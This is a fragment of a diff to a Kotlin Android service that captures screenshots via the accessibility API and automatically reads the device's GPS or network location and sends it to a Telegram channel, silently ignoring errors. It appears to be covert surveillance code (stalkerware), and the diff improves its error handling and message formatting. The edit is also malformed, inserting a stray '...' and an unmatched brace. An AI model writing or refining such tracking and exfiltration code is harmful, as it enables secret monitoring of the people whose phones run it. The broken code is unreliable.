@@ -217,12 +217,15 @@ class MyService : Service() {
                         }
                     }
 
+
 override fun onFailure(errorCode: Int) {
     val errMsg = when (errorCode) {
-        AccessibilityService.TakeScreenshotCallback.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR -> "Screenshot failed (overlay/locked)"
-        AccessibilityService.TakeScreenshotCallback.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME -> "Too many attempts"
+        AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR -> "Screenshot failed (overlay/locked)"
+        AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME -> "Too many attempts"
         else -> "Unknown error code $errorCode"
     }
+    ...
+}
 
                     
                         Log.e("Screenshot", errMsg)
@@ -453,12 +456,15 @@ override fun onFailure(errorCode: Int) {
                 try {
                     val lm = applicationContext.getSystemService(LOCATION_SERVICE) as LocationManager
                     val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+
+
+val msg = if (loc != null) {
+    "📍 Auto Location:\nLat: ${loc.latitude}, Lng: ${loc.longitude}"
+} else {
+    "📍 Auto Location (no GPS):\nLat: unavailable"
+}
+
                    
-                    val msg = if (loc != null) {
-                        "📍 Auto Location: nLat: ${loc.latitude}, Lng: ${loc.longitude}"
-                    } else {
-                        "📍 Auto Location (no GPS) : nLat: unavailable"
-                    }
                     MyService.sendStaticTelegramMessage(msg)
                 } catch (e: Exception) { /* ignore */ }
             }
